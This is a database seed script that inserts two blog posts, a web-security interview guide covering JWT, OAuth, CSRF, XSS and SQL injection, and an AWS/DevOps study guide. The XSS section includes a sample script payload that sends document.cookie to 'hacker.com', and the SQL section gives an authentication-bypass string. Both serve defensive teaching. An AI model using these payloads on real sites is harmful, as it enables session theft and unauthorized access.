import "dotenv/config";
import { prisma } from "../lib/prisma";
import path from "path";

async function seedBlogs() {

  const blog1 = {
    title: "Deep-Dive: Web Security & Authentication Essentials",
    category: "Web Security",
    date: "2026-07-16",
    readTime: "8 min read",
    excerpt: "A high-impact interview preparation guide and cheat sheet covering modern web authentication (JWT, OAuth) and critical security vulnerabilities (CSRF, XSS, SQLi).",
    content: `This guide serves as a high-impact reference for technical interviews and production system design, focusing on web security, stateless authentication, and defense strategies.

---

### 1. JWT (JSON Web Token)
*   **Definition**: An open standard (RFC 7519) defining a compact, self-contained way to securely transmit claims between parties as a JSON object. Mainly used for stateless session management.
*   **Structure**: Composed of three parts separated by dots (\`.\`): \`Header.Payload.Signature\`
    *   **Header**: Specifies the hashing algorithm (e.g., HS256) and token type.
    *   **Payload**: Contains claims—statements about the user (e.g., \`userId\`, \`roles\`, \`exp\`).
    *   **Signature**: Created by signing the encoded header and payload using a secret key to prevent tampering.
*   **Analogy**: A concert ticket with a digital barcode. The server doesn't need to look you up in a database for every purchase; it just scans the ticket's signature to verify validity.
*   **Key Interview Takeaway**: Statelessness. The server does not store session state in memory, enabling excellent scalability for distributed systems.

#### Code Snippet (Node.js - Signing and Verifying)
\`\`\`javascript
const jwt = require('jsonwebtoken');

// Payload containing user data
const payload = { userId: '12345', role: 'admin' };
const secretKey = 'my_super_secure_secret_key';

// Sign the token with a 1-hour expiration
const token = jwt.sign(payload, secretKey, { expiresIn: '1h' });
console.log('Generated JWT:', token);

// Verify the token
try {
  const decoded = jwt.verify(token, secretKey);
  console.log('Decoded Payload:', decoded);
} catch (err) {
  console.error('Invalid token:', err.message);
}
\`\`\`

---

### 2. OAuth (Open Authorization)
*   **Definition**: An open-standard authorization framework that allows third-party applications to obtain limited access to user data on another service (e.g., Google, GitHub) without exposing user passwords.
*   **Analogy**: A valet key. You don't give the valet your house keys or account password; you give them a restricted physical key that only permits driving the car a short distance and opening the trunk.
*   **Key Takeaway**: OAuth is for **Authorization** (granting permissions/access tokens), not **Authentication** (identifying who you are). OpenID Connect (OIDC) is built on top of OAuth 2.0 to handle authentication.

#### Exchange Authorization Code for Access Token
\`\`\`bash
# Requesting access token from the Authorization Server
curl -X POST https://oauth2.googleapis.com/token \\
  -d code=AUTHORIZATION_CODE_FROM_CALLBACK \\
  -d client_id=YOUR_CLIENT_ID \\
  -d client_secret=YOUR_CLIENT_SECRET \\
  -d redirect_uri=YOUR_REDIRECT_URI \\
  -d grant_type=authorization_code
\`\`\`

---

### 3. CSRF (Cross-Site Request Forgery)
*   **Definition**: A vulnerability where an attacker tricks an authenticated browser into submitting unauthorized requests to a trusted destination.
*   **How it Works**: Browsers automatically attach cookies (including active session identifiers) to all HTTP requests sent to a domain. If you are logged into your bank and click a malicious link in another browser tab, the malicious site can submit a hidden form to your bank, which your browser will authorize with your credentials.
*   **Analogy**: An attacker stealing your physical notary stamp and stamping a fake contract while you are looking away.
*   **Prevention**: Enforce Anti-CSRF Tokens (unique, unpredictable tokens validated on the server for all mutating requests) and set cookie attributes to \`SameSite=Strict\` or \`Lax\`.

#### Anti-CSRF Validation in Express
\`\`\`javascript
const express = require('express');
const csrf = require('csurf');
const cookieParser = require('cookie-parser');
const app = express();

app.use(cookieParser());
const csrfProtection = csrf({ cookie: true });

// Route to render form - generates and sends token to the client
app.get('/form', csrfProtection, (req, res) => {
  res.send(\`<form action="/process" method="POST">
              <input type="hidden" name="_csrf" value="\${req.csrfToken()}">
              <button type="submit">Submit Data</button>
            </form>\`);
});

// Route to handle POST - automatically validates CSRF token
app.post('/process', csrfProtection, (req, res) => {
  res.send('Data processed securely!');
});
\`\`\`

---

### 4. XSS (Cross-Site Scripting)
*   **Definition**: An vulnerability where malicious client-side scripts (usually JavaScript) are injected into trusted web applications and executed in the client's browser.
*   **Types**:
    *   **Stored XSS**: Malicious script is permanently stored on the server (e.g., comment database) and served to other visitors.
    *   **Reflected XSS**: Script is part of the request payload (e.g., query params) and reflected back instantly in the response page.
*   **Analogy**: Writing a hypnotic spell on a public bulletin board. Anyone who reads it obeys the spell's commands.
*   **Prevention**: Sanitize user inputs, contextually encode outputs (e.g., converting \`<\` to \`&lt;\`), and configure a strict Content Security Policy (CSP).

#### HTML Output Escaping
\`\`\`javascript
function escapeHTML(str) {
  return str.replace(/[&<>"']/g, function(match) {
    const escapeMap = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#x27;'
    };
    return escapeMap[match];
  });
}

const maliciousInput = "<script>fetch('hacker.com/steal?cookie=' + document.cookie)</script>";
const safeOutput = escapeHTML(maliciousInput);
console.log(safeOutput); 
// Output: &lt;script&gt;fetch('hacker.com/steal?cookie=' + document.cookie)&lt;/script&gt;
// (Renders safely as plain text in the browser instead of executing)
\`\`\`

---

### 5. SQL Injection (SQLi)
*   **Definition**: An attack vector where SQL commands are injected into user inputs to manipulate backend database queries.
*   **Analogy**: Telling a bank teller, "Please deposit this check. Oh, and by the way, transfer all remaining vaults funds to my account."
*   **Prevention**: Use Parameterized Queries (Prepared Statements) or standard ORMs (like Prisma or Hibernate) which parameterize queries by default.

#### Vulnerable vs. Secure Database Queries
\`\`\`javascript
const { Client } = require('pg');
const client = new Client();

// VULNERABLE: Direct string concatenation
const unsafeQuery = \`SELECT * FROM users WHERE username = '\${req.body.username}' AND password = '\${req.body.password}'\`;
// If username is: admin' OR '1'='1 -- it bypasses authentication entirely.

// SECURE: Parameterized Query
const safeQuery = 'SELECT * FROM users WHERE username = $1 AND password = $2';
const values = [req.body.username, req.body.password];

client.query(safeQuery, values)
  .then(res => console.log('User authenticated safely'))
  .catch(err => console.error(err.stack));
\`\`\`
`
  };

  const blog2 = {
    title: "AWS Cloud Infrastructure & DevOps Study Guide",
    category: "Cloud & DevOps",
    date: "2026-07-16",
    readTime: "12 min read",
    excerpt: "A comprehensive cheat sheet and roadmap for AWS Cloud computing, Docker/Kubernetes container orchestration, Infrastructure as Code (Terraform), and DevOps deployment strategies.",
    content: `This guide compiles high-frequency cloud and DevOps infrastructure concepts, mapping AWS service abstractions, CLI syntax patterns, and cloud-native choices.

---

### 1. EC2 (Elastic Compute Cloud)
*   **Definition**: Scalable virtual machines in the AWS cloud (Infrastructure as a Service - IaaS).
*   **Takeaway**: Provides raw computing capacity. You maintain full OS-level control and are responsible for kernel patches, updates, firewall ports, and system configurations.

#### AWS CLI - EC2 Operations
\`\`\`bash
# List all running EC2 instances in your configured region
aws ec2 describe-instances --filters "Name=instance-state-name,Values=running"

# Start an EC2 instance
aws ec2 start-instances --instance-ids i-0123456789abcdef0

# Stop an EC2 instance
aws ec2 stop-instances --instance-ids i-0123456789abcdef0
\`\`\`

---

### 2. Lambda (FaaS)
*   **Definition**: Serverless compute service (Function as a Service) that runs code in response to events and scales automatically.
*   **Takeaway**: Zero server provisioning or management. You pay only for compute time consumed per millisecond of execution. Maximum execution timeout is hard-capped at 15 minutes.

#### Python Lambda Handler & AWS CLI Invocation
\`\`\`python
# lambda_function.py
import json

def lambda_handler(event, context):
    print("Received event: " + json.dumps(event))
    name = event.get('name', 'World')
    return {
        'statusCode': 200,
        'body': json.dumps(f'Hello, {name}!')
    }
\`\`\`
\`\`\`bash
# Invoke Lambda function remotely via AWS CLI and save output
aws lambda invoke \\
  --function-name my-hello-function \\
  --payload '{"name": "Safir"}' \\
  response.json
\`\`\`

---

### 3. Container Orchestration: ECS vs. EKS
*   **ECS (Elastic Container Service)**: AWS-proprietary container orchestrator. Easy configuration, deeply integrated with IAM, CloudWatch, and ALB.
*   **EKS (Elastic Kubernetes Service)**: AWS-managed Kubernetes. Highly portable, open-source standard, but introduces more operational complexity.
*   **Analogy**: ECS is like iOS (simple, seamless inside the ecosystem). EKS is like custom Android (infinite configuration options, but you manage the orchestration overhead).

#### Docker and Kubernetes Commands
\`\`\`bash
# Build and tag a container image
docker build -t my-app:latest .

# List production Kubernetes pods using kubectl
kubectl get pods -n production

# Describe details of an ECS Service
aws ecs describe-services --cluster my-cluster --services my-service
\`\`\`

---

### 4. Cloud Storage: S3 vs. EBS
*   **S3 (Simple Storage Service)**: Object storage designed for web-scale access. Infinite capacity, accessible via HTTP/API, extremely cheap. Best for assets, backups, and logs.
*   **EBS (Elastic Block Store)**: Block storage. Virtual SSD/HDD attached directly to a single EC2 instance. Best for active operating systems and transactional databases.
*   **Analogy**: S3 is like Dropbox (upload files, share URLs). EBS is the physical SSD plugged into your computer's motherboard.

#### CLI Interactions
\`\`\`bash
# Upload a file to an S3 object store
aws s3 cp localfile.txt s3://my-unique-bucket-name/backup/

# List block devices on a Linux EC2 instance to check EBS mount status
lsblk
\`\`\`

---

### 5. Managed Databases: RDS vs. DynamoDB
*   **RDS**: Managed relational SQL service (supporting PostgreSQL, MySQL, SQL Server). Best for structured schemas, complex SQL queries, and ACID transactions.
*   **DynamoDB**: Serverless, fully managed NoSQL key-value database. Delivers single-digit millisecond latency at any scale.

#### Python Boto3 - Writing to DynamoDB
\`\`\`python
import boto3

# Initialize DynamoDB client resource
dynamodb = boto3.resource('dynamodb', region_name='eu-north-1')
table = dynamodb.Table('UsersTable')

# Insert item
table.put_item(
   Item={
        'userId': '12345',
        'username': 'safir_jameel',
        'email': 'safir.jameel@gmail.com',
        'status': 'Active'
    }
)
print("Item inserted successfully.")
\`\`\`

---

### 6. Infrastructure as Code (IaC): CloudFormation vs. Terraform
*   **CloudFormation**: AWS-native declarative JSON/YAML infrastructure modeling tool.
*   **Terraform**: Open-source, cloud-agnostic declarative engine developed by HashiCorp using HCL (HashiCorp Configuration Language).

#### Terraform Configuration & CLI Workflow
\`\`\`hcl
# main.tf
provider "aws" {
  region = "eu-north-1"
}

resource "aws_instance" "web_server" {
  ami           = "ami-0123456789abcdef0"
  instance_type = "t3.micro"
  tags = {
    Name = "Terraform-Web-Server"
  }
}
\`\`\`
\`\`\`bash
# Initialize Terraform workspace
terraform init

# Generate and view execution plans
terraform plan

# Apply infrastructure configurations
terraform apply -auto-approve
\`\`\`

---

### 7. AI/ML on AWS: SageMaker vs. Bedrock
*   **SageMaker**: Complete ML platform to build, train, evaluate, and host custom machine learning models.
*   **Bedrock**: Serverless API access to pre-trained Foundation Models (e.g., Anthropic Claude, Meta Llama, Cohere Command).
*   **Analogy**: SageMaker is buying raw lumber to craft a custom desk. Bedrock is buying pre-fabricated pieces from IKEA and putting them to work immediately.

#### Python Boto3 - Invoking Claude on Bedrock
\`\`\`python
import boto3
import json

bedrock_client = boto3.client('bedrock-runtime', region_name='us-east-1')
prompt = "Explain RAG (Retrieval-Augmented Generation) in one sentence."

body = json.dumps({
    "prompt": f"\\n\\nHuman: {prompt}\\n\\nAssistant:",
    "max_tokens_to_sample": 100
})

response = bedrock_client.invoke_model(
    modelId="anthropic.claude-v2",
    body=body
)

response_body = json.loads(response.get('body').read())
print(response_body.get('completion'))
\`\`\`

---

### 8. Pub/Sub vs. Queuing: SNS vs. SQS
*   **SNS (Simple Notification Service)**: Pub/Sub message hub. Push-based. Instantly fans out a message to multiple subscribing endpoints (HTTP, Lambda, SQS, Email).
*   **SQS (Simple Queue Service)**: Message queuing service. Pull-based. Decouples distributed services by buffer-holding messages until workers pull and process them.
*   **Analogy**: SNS is a radio station broadcasting live. SQS is a post office box holding letters until you drop by to collect them.

#### AWS CLI - SNS/SQS Operations
\`\`\`bash
# Publish message to an SNS topic
aws sns publish \\
  --topic-arn arn:aws:sns:eu-north-1:123456789012:MyTopic \\
  --message "Deployment succeeded"

# Receive/Pull message from SQS Queue
aws sqs receive-message \\
  --queue-url https://sqs.eu-north-1.amazonaws.com/123456789012/MyQueue
\`\`\`

---

### 9. Firewall Layers: Security Group vs. NACL
*   **Security Group**: Firewall rules applied at the **Instance** level. Stateful (Inbound responses are automatically allowed outbound). Supports "Allow" rules only.
*   **Network ACL (NACL)**: Firewall rules applied at the **Subnet** boundary. Stateless (Requires writing separate rules for both inbound and outbound traffic). Supports "Allow" and "Deny" rules.

#### AWS CLI - Security Group Config
\`\`\`bash
# Authorize inbound port 80 (HTTP) on a Security Group
aws ec2 authorize-security-group-ingress \\
  --group-id sg-0123456789abcdef0 \\
  --protocol tcp \\
  --port 80 \\
  --cidr 0.0.0.0/0
\`\`\`

---

### 10. CI/CD Lifecycle: From git push to Production
The journey of a code change follows this sequence:

*   **Continuous Integration (CI)**:
    *   **Trigger**: A developer pushes code to \`main\` or opens a Pull Request.
    *   **Setup**: The pipeline spins up a clean, isolated container (e.g., Ubuntu).
    *   **Install & Lint**: Runs \`npm ci\` and \`eslint\` to ensure standard dependencies and clean code styling.
    *   **Test**: Executes all unit and integration tests (\`npm run test\`).
    *   **Build**: Compiles the project (e.g., \`npm run build\` or packages a Docker container).
*   **Continuous Delivery/Deployment (CD)**:
    *   **Deploy to Staging**: Injects staging variables and deploys code to a test/staging environment.
    *   **Integration Tests**: Automated end-to-end tests (like Cypress) run against the live staging URL.
    *   **Deploy to Production**: Promotes/swaps the build to the live server (using Blue-Green deployment or serverless CDNs like Vercel).

---

### 11. DevSecOps: Security Scanning
Security (DevSecOps) is executed at different stages of the lifecycle to prevent vulnerabilities from reaching production:

| Security Type | Where It Runs | Tools Used | What It Does |
| :--- | :--- | :--- | :--- |
| **SCA** (Software Composition Analysis) | **CI Phase (Early)** - Right after dependencies are installed. | \`npm audit\`, \`Snyk\` | Scans third-party libraries (\`package.json\`) for known security flaws. |
| **SAST** (Static Application Security Testing) | **CI Phase (Before Build)** - Analyzes the raw code. | \`SonarQube\`, \`GitHub CodeQL\` | Scans raw source code for code smells, SQL injection entry points, or hardcoded secrets. |
| **Container Scanning** | **CI Phase (Post-Build)** - Right after creating a Docker image. | \`Trivy\`, \`Anchore\` | Scans the container's base operating system files for OS-level vulnerabilities. |
| **DAST** (Dynamic Application Security Testing) | **Post-Deploy (Staging)** - Scans the active running website. | \`OWASP ZAP\` | Simulates active hacker attacks (like XSS or SQLi) against the live staging application. |

---

### 12. Secret Management: Storing Secrets, Passwords, and API Keys
*   **Rule #1**: Never commit secrets to Git.
*   **CI/CD Pipeline Secrets**: Store in GitHub Secrets or Jenkins Credentials. They are injected as encrypted environment variables in the repository settings page and accessed during build time via \`\${{ secrets.SUPABASE_API_KEY }}\`.
*   **Enterprise Cloud Secrets Managers**: Use HashiCorp Vault, AWS Secrets Manager, or Google Cloud Secret Manager. The runner authenticates via IAM roles and fetches the secrets dynamically.
*   **OIDC (OpenID Connect)**: Modern pipelines do not store permanent credentials (like AWS Access Keys) in GitHub. Instead, they use OIDC to request short-lived, temporary access tokens from AWS during the build run.

---

### 13. Rollback Strategies: Handling Deployment Failures
If a live deployment fails, the goal is to return to a working state instantly with zero downtime:

1.  **Instant CDN/DNS Rollback (Vercel/Netlify)**:
    *   Vercel keeps a history of your previous successful builds. If a deployment fails, you click "Rollback" (or trigger it via API). Vercel instantly routes your domain to point to the previous successful build hash. This takes 1 second and requires no code compiling.
2.  **Blue-Green Deployments (AWS/Docker/Kubernetes)**:
    *   You maintain two environments: **Blue** (current live version) and **Green** (new deployment).
    *   You deploy the new version to Green. A load balancer runs health checks. If Green fails health checks, traffic is kept on Blue. The user never notices a crash.
3.  **Database Migration Safety**:
    *   Migrations must be backward compatible. Never delete database columns during a new deployment. Instead, add columns first, deploy the code, verify, and then delete old columns in a subsequent release. This allows you to roll back code without breaking the database.

---

### 14. Real-World Interview Case Study: Cache Corruption
*   **The Problem**: Corrupted dependency caching leading to build failures.
*   **Situation**: We cached \`node_modules\` in our GitHub Actions pipeline to speed up the builds. However, when a developer updated a package version (e.g. from 1.1.0 to 1.2.0), the CI server kept using the old cached \`node_modules\` folder, causing compile errors in production like "Module not found" or typing mismatches.
*   **The Resolution**:
    1.  **Cache Key Hashing**: We updated the cache action key to hash the lockfile: \`key: npm-\${{ hashFiles('package-lock.json') }}\`. If the lockfile changes, the cache is instantly invalidated, forcing a clean download.
    2.  **Enforced Clean Installs**: We replaced \`npm install\` with \`npm ci\` in our pipeline. \`npm ci\` is designed specifically for CI servers: it deletes the local \`node_modules\` folder first, verifies the lockfile matches the \`package.json\` exactly, and installs dependencies cleanly. This eliminated caching bugs completely.
`
  };

  try {
    console.log("Connecting to database to insert blog posts...");
    // Check if they already exist to avoid duplicate seedings
    const existing1 = await prisma.blogPost.findFirst({
      where: { title: blog1.title }
    });
    if (!existing1) {
      const created1 = await prisma.blogPost.create({ data: blog1 });
      console.log(`Created Blog Post: "${created1.title}" (ID: ${created1.id})`);
    } else {
      const updated1 = await prisma.blogPost.update({
        where: { id: existing1.id },
        data: blog1
      });
      console.log(`Updated Blog Post: "${updated1.title}" (ID: ${updated1.id})`);
    }

    const existing2 = await prisma.blogPost.findFirst({
      where: { title: blog2.title }
    });
    if (!existing2) {
      const created2 = await prisma.blogPost.create({ data: blog2 });
      console.log(`Created Blog Post: "${created2.title}" (ID: ${created2.id})`);
    } else {
      const updated2 = await prisma.blogPost.update({
        where: { id: existing2.id },
        data: blog2
      });
      console.log(`Updated Blog Post: "${updated2.title}" (ID: ${updated2.id})`);
    }

    console.log("Seeding complete!");
  } catch (error) {
    console.error("Database seeding failed:", error);
  } finally {
    await prisma.$disconnect();
  }
}

seedBlogs();
